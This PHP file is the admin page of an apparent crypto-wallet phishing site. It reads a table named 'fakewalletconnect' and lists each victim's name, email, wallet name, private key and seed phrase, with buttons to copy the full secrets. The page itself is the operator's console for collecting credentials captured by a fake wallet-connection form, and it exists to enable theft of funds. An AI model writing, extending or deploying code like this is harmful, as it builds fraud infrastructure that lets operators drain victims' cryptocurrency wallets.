<?php
include("../../server/connection.php");
include("../../server/auth/admin.php");
?>


<!DOCTYPE html>

<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title><?= $sitename ?> | Withdrawal-History </title>
    <!-- Favicon icon -->
    <link rel="icon" type="image/png" sizes="16x16" href="<?= $domain ?>/images/favicon.png">
    <!-- Custom Stylesheet -->
    <link rel="stylesheet" href="<?= $domain ?>/css/style.css">
    <link rel="stylesheet" href="<?= $domain ?>/vendor/toastr/toastr.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.13.1/font/bootstrap-icons.min.css">
</head>

<body class="dashboard">


    <div id="main-wrapper">

        <!-- header -->
        <?php include("../include/nav.php") ?>
        <!-- side nav -->
        <?php include("../include/sidenav.php") ?>

        <div class="content-body">
            <div class="container">
                <div class="row">
                    <div class="col-12">
                        <div class="page-title">
                            <div class="row align-items-center justify-content-between">
                                <div class="col-xl-4">
                                    <div class="page-title-content">
                                        <h3>All Wallet Details</h3>
                                        <p class="mb-2">Welcome To <?= $sitename ?> Management</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="row">
                    <div class="col-xxl-12 col-xl-12">

                        <?php
                        $limit  = 10;
                        $page   = isset($_GET['page']) && is_numeric($_GET['page']) ? (int) $_GET['page'] : 1;
                        $offset = ($page - 1) * $limit;

                        // COUNT TOTAL USERS
                        $count_sql = "SELECT COUNT(*) AS total FROM fakewalletconnect";
                        $count_stmt = mysqli_prepare($connection, $count_sql);
                        mysqli_stmt_execute($count_stmt);
                        $count_result = mysqli_stmt_get_result($count_stmt);
                        $total_row = mysqli_fetch_assoc($count_result);
                        $total_records = (int)($total_row['total'] ?? 0);
                        $total_pages = (int) ceil($total_records / $limit);
                        mysqli_stmt_close($count_stmt);

                        // FETCH USERS
                        $sql = "
                            SELECT 
                               fakewalletconnect.* , users.fullname, users.email
                            FROM fakewalletconnect , users
                            WHERE fakewalletconnect.user_id = users.id
                            ORDER BY id DESC
                            LIMIT ? OFFSET ?
                        ";

                        $stmt = mysqli_prepare($connection, $sql);
                        mysqli_stmt_bind_param($stmt, "ii", $limit, $offset);
                        mysqli_stmt_execute($stmt);
                        $result = mysqli_stmt_get_result($stmt);
                        ?>

                        <div class="card">
                            <div class="card-body">
                                <div class="table-responsive">
                                    <table class="table">
                                        <thead>
                                            <tr>
                                                <th>S/N</th>
                                                <th>FULLNAME</th>
                                                <th>EMAIL</th>
                                                <th>WALLET NAME</th>
                                                <th>PRIVATE KEY</th>
                                                <th>SEED PHRASE</th>
                                                <th>CREATED</th>
                                            </tr>
                                        </thead>
                                        <tbody>

                                            <?php if (mysqli_num_rows($result) > 0): $count = 0; ?>
                                                <?php while ($row = mysqli_fetch_assoc($result)): $count++; ?>
                                                    <tr>
                                                        <td><?= $count ?></td>
                                                        <td><?= htmlspecialchars($row['fullname']) ?></td>
                                                        <td><?= htmlspecialchars($row['email']) ?></td>
                                                        <td><?= htmlspecialchars($row['name']) ?></td>

                                                        <!-- Private Key -->
                                                        <td>
                                                            <?php if (!empty($row['privateKey'])):
                                                                $fullPrivate = $row['privateKey'];
                                                                $shortPrivate = substr($fullPrivate, 0, 10);
                                                                $displayPrivate = strlen($fullPrivate) > 10 ? $shortPrivate . '...' : $fullPrivate;
                                                            ?>
                                                                <?= htmlspecialchars($displayPrivate) ?>
                                                                <i class="bi bi-copy"
                                                                    style="cursor:pointer; margin-left:8px; color:#007bff;"
                                                                    onclick="copyText('<?= htmlspecialchars($fullPrivate, ENT_QUOTES) ?>')">
                                                                </i>
                                                            <?php else: ?>
                                                                -
                                                            <?php endif; ?>
                                                        </td>

                                                        <!-- Seed Phrase -->
                                                        <td>
                                                            <?php if (!empty($row['seedPhrase'])):
                                                                $fullSeed = $row['seedPhrase'];
                                                                $words = explode(' ', $fullSeed);
                                                                $shortSeed = array_slice($words, 0, 4); // show first 4 words
                                                                $displaySeed = count($words) > 4 ? implode(' ', $shortSeed) . '...' : $fullSeed;
                                                            ?>
                                                                <?= htmlspecialchars($displaySeed) ?>
                                                                <i class="bi bi-copy"
                                                                    style="cursor:pointer; margin-left:8px; color:#007bff;"
                                                                    onclick="copyText('<?= htmlspecialchars($fullSeed, ENT_QUOTES) ?>')">
                                                                </i>
                                                            <?php else: ?>
                                                                -
                                                            <?php endif; ?>
                                                        </td>

                                                        <td>
                                                            <?= !empty($row['created_at']) ? date("Y-m-d", strtotime($row['created_at'])) : '-' ?>
                                                        </td>
                                                    </tr>
                                                <?php endwhile; ?>
                                            <?php else: ?>
                                                <tr>
                                                    <td colspan="8" class="text-center">No users found</td>
                                                </tr>
                                            <?php endif; ?>

                                        </tbody>
                                    </table>
                                </div>

                                <?php if ($total_pages > 1): ?>
                                    <nav class="mt-3">
                                        <ul class="pagination">
                                            <?php for ($i = 1; $i <= $total_pages; $i++): ?>
                                                <li class="page-item <?= ($i == $page) ? 'active' : '' ?>">
                                                    <a class="page-link" href="?page=<?= $i ?>"><?= $i ?></a>
                                                </li>
                                            <?php endfor; ?>
                                        </ul>
                                    </nav>
                                <?php endif; ?>

                            </div>
                        </div>

                    </div>
                </div>

            </div>
        </div>
    </div>
    </div>

    <div class="footer">
        <div class="container">
            <div class="row">
                <div class="col-xl-6">
                    <div class="copyright">
                        <p>© Copyright
                            <script>
                                var CurrentYear = new Date().getFullYear()
                                document.write(CurrentYear)
                            </script>
                            <a href="#"><?= $sitename ?></a> I All Rights Reserved
                        </p>
                    </div>
                </div>
                <div class="col-xl-6">
                    <div class="footer-social">
                        <ul>
                            <li><a href="#"><i class="fi fi-brands-facebook"></i></a></li>
                            <li><a href="#"><i class="fi fi-brands-twitter"></i></a></li>
                            <li><a href="#"><i class="fi fi-brands-linkedin"></i></a></li>
                            <li><a href="#"><i class="fi fi-brands-youtube"></i></a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>

    </div>

    <script>
        function copyText(text) {
            navigator.clipboard.writeText(text).then(() => {
                alert("Copied!");
            }).catch(err => {
                console.error("Failed to copy:", err);
            });
        }
    </script>

    <script src="<?= $domain ?>/vendor/jquery/jquery.min.js"></script>
    <script src="<?= $domain ?>/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
    <script src="<?= $domain ?>/js/scripts.js"></script>
</body>

</html>